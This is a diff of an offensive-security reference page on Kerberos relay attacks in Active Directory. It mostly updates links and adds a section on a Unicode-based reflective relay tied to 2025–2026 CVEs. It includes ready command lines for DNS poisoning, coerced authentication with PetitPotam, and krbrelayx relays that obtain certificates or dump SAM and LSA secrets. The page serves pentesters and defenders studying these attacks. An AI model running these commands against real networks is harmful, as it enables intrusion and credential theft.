@@ -4,9 +4,9 @@ title: "Kerberos relay"
 
 ## Theory
 
-Under certain conditions, an attacker can relay Kerberos authentication to targets of his choosing. Depending on the mitigations in place, he will be able to move laterally and escalate privileges within an Active Directory domain. It is essential to have a good understanding of [the basic operation of the Kerberos protocol](https://www.thehacker.recipes/ad/movement/kerberos/) in order to understand relay attacks on it.
+Under certain conditions, an attacker can relay Kerberos authentication to targets of his choosing. Depending on the mitigations in place, he will be able to move laterally and escalate privileges within an Active Directory domain. It is essential to have a good understanding of [the basic operation of the Kerberos protocol](/ad/movement/kerberos) in order to understand relay attacks on it.
 
-The aim is to relay an `AP-REQ` message (service access request with a Service Ticket), initiated by a client for one service, to another service. However, there is one crucial prerequisite: **the targeted service and client must not apply encryption or signing**, as we do not possess the secret (the session key) needed to perform these operations, as in the case of an [NTLM relay](https://www.thehacker.recipes/ad/movement/ntlm/relay#Session-signing) attack.
+The aim is to relay an `AP-REQ` message (service access request with a Service Ticket), initiated by a client for one service, to another service. However, there is one crucial prerequisite: **the targeted service and client must not apply encryption or signing**, as we do not possess the secret (the session key) needed to perform these operations, as in the case of an [NTLM relay](/ad/movement/ntlm/relay#session-signing) attack.
 
 Furthermore, an `AP-REQ` message cannot be relayed **to a service running under a different identity to the one initially requested by the client**. So for the attack to succeed, we need to force the client to generate an `AP-REQ` for the target host and send it to us.
 
@@ -20,7 +20,7 @@ In particular, it is important to note that, due to stricter configuration of ex
 
 <Callout type="info">
 
-For these reasons, Kerberos relay has no direct advantage over NTLM relay. Its advantage lies more in the fact that NTLM authentication can sometimes be disabled on the Active Directory domain, that the target service of the relay can only authorises Kerberos (for example, in the case of an [AD CS web enrolment service](https://www.thehacker.recipes/ad/movement/adcs/unsigned-endpoints#Web-endpoint-ESC8) that has been hardened), or that the client belongs to the [Protected Users group](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group).
+For these reasons, Kerberos relay has no direct advantage over NTLM relay. Its advantage lies more in the fact that NTLM authentication can sometimes be disabled on the Active Directory domain, that the target service of the relay can only authorises Kerberos (for example, in the case of an [AD CS web enrolment service](/ad/movement/ad-cs/unsigned-endpoints#web-endpoint-esc8) that has been hardened), or that the client belongs to the [Protected Users group](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group).
 
 </Callout>
 
@@ -36,7 +36,7 @@ Dirk-jan Mollema has demonstrated in [this blog post](https://dirkjanm.io/relayi
 >
 > _(Cloudflare,_ [_source_](https://www.cloudflare.com/learning/dns/dns-records/dns-soa-record/)_)_
 
-An interesting service for relaying authentications is the AD CS HTTP service, which by default is vulnerable to relay attacks as it does not enforce signing with HTTP, allowing an [ESC8](https://www.thehacker.recipes/ad/movement/adcs/unsigned-endpoints#Web-endpoint-ESC8) to be exploited via Kerberos from a [mitm6 DNS poisoning](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/dhcpv6-spoofing).
+An interesting service for relaying authentications is the AD CS HTTP service, which by default is vulnerable to relay attacks as it does not enforce signing with HTTP, allowing an [ESC8](/ad/movement/ad-cs/unsigned-endpoints#web-endpoint-esc8) to be exploited via Kerberos from a [mitm6 DNS poisoning](/ad/movement/mitm-and-coerced-authentications/dhcpv6-spoofing).
 
 DNS is used in Kerberos authentication operations in Active Directory. In particular, it is used through [Secure dynamic updates](https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/configure-dns-dynamic-updates-windows-server-2003), which are used to keep DNS records synchronised with the IP addresses of dynamically addressed clients.
 
@@ -57,7 +57,7 @@ During the `TKEY` request, Kerberos authentication takes place via `AP-REQ` and 
 
 As the DNS is usually on the domain controller, the Kerberos tickets obtained will be valid for services on the DC, the account name being the same. However, the `TKEY` request asks for the exchanges to be signed. A relay to LDAP/S is therefore impossible, as the latter will automatically set up the signature. Furthermore, as the SPN requested is `DNS`, this also limits the possibilities. However:
 
-* The HTTP/S services [from AD CS](https://www.thehacker.recipes/ad/movement/adcs/unsigned-endpoints#Web-endpoint-ESC8) and [SCCM](https://www.thehacker.recipes/ad/movement/sccm-mecm/privilege-escalation) can be very good targets as HTTP does not expect a request for a signature.
+* The HTTP/S services [from AD CS](/ad/movement/ad-cs/unsigned-endpoints#web-endpoint-esc8) and [SCCM](/ad/movement/sccm-mecm/credential-harvesting) can be very good targets as HTTP does not expect a request for a signature.
 * Many services are actually mapped to the `HOST` service, and this is the case with `DNS`. So any host with a `HOST` service becomes valid.
 
 Here are the steps to follow to set up a Kerberos relay using IPv6 DNS poisoning:
@@ -78,7 +78,7 @@ mitm6 -i $ATTACKER_IP -d $DOMAIN -hw $TARGET_FQDN --relay $ADCS_FQDN -v
 
 ### Abuse from a coerced authentication <a href="#abuse-from-a-coerced-authentication" id="abuse-from-a-coerced-authentication"></a>
 
-As demonstrated by Synacktiv in [this blog post](https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx), it is also possible to relay a Kerberos authentication from, and to, unsigned SMB services, when it comes [from a coercion](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/).
+As demonstrated by Synacktiv in [this blog post](https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx), it is also possible to relay a Kerberos authentication from, and to, unsigned SMB services, when it comes [from a coercion](/ad/movement/mitm-and-coerced-authentications).
 
 When an SMB client builds the SPN from the service class and its name, the `SecMakeSPNEx2` method is called, which calls the `CredMarshalTargetInfo` API function. This API takes a list of target information in a `CREDENTIAL_TARGET_INFORMATION` structure, _marshalizes_ it in Base64, and appends it to the end of the actual SPN.
 
@@ -88,7 +88,7 @@ For the hostname `target` and the class of service `cifs`, the returned SPN will
 cifs/target1UWhRCAAAAAAAAAAUAAAAAAAAAAAAAAAAAAAAAtargetsBAAAA
 ```
 
-So, if an attacker registers the DNS record `target1UWhRCAAAAAAAAAAUAAAAAAAAAAAAAAAAAAAAAtargetsBAAAA`, the client will be able to request a ticket for `cifs/target`, but will connect to `target1UWhRCAAAAAAAAAAUAAAAAAAAAAAAAAAAAAAAAtargetsBAAAA`. By default, any authenticated user is allowed to create [new DNS records in the ADIDNS](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/adidns-spoofing).
+So, if an attacker registers the DNS record `target1UWhRCAAAAAAAAAAUAAAAAAAAAAAAAAAAAAAAAtargetsBAAAA`, the client will be able to request a ticket for `cifs/target`, but will connect to `target1UWhRCAAAAAAAAAAUAAAAAAAAAAAAAAAAAAAAAtargetsBAAAA`. By default, any authenticated user is allowed to create [new DNS records in the ADIDNS](/ad/movement/mitm-and-coerced-authentications/adidns-spoofing).
 
 In his [original article](https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html), James Forshaw notes this point:
 
@@ -104,7 +104,7 @@ It is therefore necessary to restrict the content of the `CREDENTIAL_TARGET_INFO
 dnstool.py -u "$DOMAIN\\$USERNAME" -p "$PASSWORD" -r "[ADCS_NETBIOS]1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA" -d "$ATTACKER_IP" --action add "$DC_IP" --tcp
 ```
 
-2. Then, trigger an authentication coerce (for example, with [PetitPotam](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/ms-efsr)) from the target to the DNS record, and relay the authentication with [krbrelayx](https://github.com/dirkjanm/krbrelayx) (Python). For example, here to the [PKI HTTP endpoint](https://www.thehacker.recipes/ad/movement/adcs/unsigned-endpoints#Web-endpoint-ESC8):
+2. Then, trigger an authentication coerce (for example, with [PetitPotam](/ad/movement/mitm-and-coerced-authentications/ms-efsr)) from the target to the DNS record, and relay the authentication with [krbrelayx](https://github.com/dirkjanm/krbrelayx) (Python). For example, here to the [PKI HTTP endpoint](/ad/movement/ad-cs/unsigned-endpoints#web-endpoint-esc8):
 
 ```
 # In a first terminal, krbrelayx waiting for an authentication to relay
@@ -114,7 +114,7 @@ krbrelayx.py -t 'http://$ADCS_FQDN/certsrv/certfnsh.asp' --adcs --template Domai
 Petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD "[ADCS_NETBIOS]1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA" $TARGET_IP
 ```
 
-In the case where the target of the relay (**the machine receiving the relay**) is an unsigned SMB service, and the authentication obtained is privileged, the following command will [dump the SAM and the LSA secrets](https://www.thehacker.recipes/ad/movement/credentials/dumping/sam-and-lsa-secrets):
+In the case where the target of the relay (**the machine receiving the relay**) is an unsigned SMB service, and the authentication obtained is privileged, the following command will [dump the SAM and the LSA secrets](/redteam/credentials/os-credentials/windows-and-active-directory/sam-and-lsa-secrets):
 
 ```
 krbrelayx.py -t smb://$TARGET_FQDN
@@ -129,7 +129,7 @@ When a web server requests Kerberos authentication, it does not use the destinat
 
 However, an attacker in a Man-in-the-Middle position can poison the DNS response and indicate that the HTTP server's FQDN points to him. In this way, the victim will obtain an ST for the server, construct the `AP-REQ`, and send it to the attacker. This is the attack Synacktiv has demonstrated in [this article](https://www.synacktiv.com/publications/abusing-multicast-poisoning-for-pre-authenticated-kerberos-relay-over-http-with).
 
-Note that the technique will not work for SMB clients, because it is not possible to opportunistically respond via LLMNR to non-existent hostnames in SMB with a response name containing a `CREDENTIAL_TARGET_INFORMATION` structure. This structure is explained [in the previous section](https://www.thehacker.recipes/ad/movement/kerberos/relay#Abuse-from-a-coerced-authentication).
+Note that the technique will not work for SMB clients, because it is not possible to opportunistically respond via LLMNR to non-existent hostnames in SMB with a response name containing a `CREDENTIAL_TARGET_INFORMATION` structure. This structure is explained [in the previous section](/ad/movement/kerberos/kerberos-relay#abuse-from-a-coerced-authentication).
 
 > Another limitation is that, according to our tests, other local name resolution protocols such as mDNS and NBTNS cannot be abused to carry out the attack. Indeed, while LLMNR responses contain both the query sent by the client and the response, this is not the case of mDNS and NBTNS, which only contain responses.\[...]
 >
@@ -141,7 +141,7 @@ Finally, most HTTP clients use the Kerberos `Negociate` package, which forces th
 
 Here are the different steps to perform the attack:
 
-1. Set up an [LLMNR poisoner](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/llmnr-nbtns-mdns-spoofing), for example with [Responder](https://github.com/lgandx/Responder) (Python).
+1. Set up an [LLMNR poisoner](/ad/movement/mitm-and-coerced-authentications/llmnr-nbtns-mdns-spoofing), for example with [Responder](https://github.com/lgandx/Responder) (Python).
 2. An HTTP client fails to resolve a hostname, for any reason.
 3. The LLMNR poisoner poisons the victim, and indicates that the hostname resolves to the attacker's machine. **In the LLMNR response, the response name differs from the request and corresponds to an arbitrary relay target.**
 4. The victim makes a request to the attacker's web server, which requires Kerberos authentication.
@@ -160,7 +160,29 @@ When a request for LLMNR resolution arrives, Responder will reply with the targe
 python3 krbrelayx.py --target 'http://$ADCS_FQDN/certsrv/' -ip $ATTACKER_IP --adcs --template User
 ```
 
-This attack can also work by forcing [a WebDAV authentication](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/webclient) to a record that does not exist. The absence of a DNS record will generate an LLMNR fallback, leading to the same result.
+This attack can also work by forcing [a WebDAV authentication](/ad/movement/mitm-and-coerced-authentications/webclient) to a record that does not exist. The absence of a DNS record will generate an LLMNR fallback, leading to the same result.
+
+### Reflective relay (CVE-2025-58726 / CVE-2026-26128)
+
+A 2026 technique (patched March 2026) abuses Unicode normalization inconsistencies between Windows components to relay a machine's own Kerberos authentication back to itself. A DNS record is spoofed with lookalike Unicode characters (e.g. `SⓇV1․AD․LOCAL`, with `Ⓡ` = U+24C7 and `․` = U+2024): the DC's LDAP normalizes it (`LCMapStringEx` with `NORM_IGNORECASE | NORM_IGNORENONSPACE | NORM_IGNOREWIDTH`) to the target machine's SPN, while the `DnsCache` service (`CompareStringW`, `NORM_IGNORECASE` only) does not treat it as localhost, so the name resolves toward the attacker.
+
+```bash
+# 1. Register the lookalike DNS record pointing at the attacker
+dnstool.py -u "$DOMAIN"\\"$USER" -p "$PASSWORD" "$DC_IP" --action add -r "<TARGET_NETBIOS_UNICODE>.<DOMAIN_UNICODE>" -d "$ATTACKER_IP"
+
+# 2. Relay the coerced Kerberos authentication back to the target
+krbrelayx.py -t smb://"$TARGET_FQDN"
+petitpotam.py -u "$USER" -p "$PASSWORD" -d "$DOMAIN" "<TARGET_NETBIOS_UNICODE>.<DOMAIN_UNICODE>" "$TARGET_FQDN"
+
+# 3. Clean up the rogue record
+dnstool.py -u "$DOMAIN"\\"$USER" -p "$PASSWORD" "$DC_IP" --action remove -r "<TARGET_NETBIOS_UNICODE>.<DOMAIN_UNICODE>" --tcp
+```
+
+<Callout type="warn">
+
+The modified `krbrelayx.py` required for this attack was not public at the time of writing (June 2026); watch Synacktiv's publications and the krbrelayx repository. Even after the March 2026 patches, services without channel binding stay exposed (AD CS Web Enrollment, SCCM AdminService, MSSQL). Always remove the rogue DNS record afterwards.
+
+</Callout>
 
 ## Resources
 
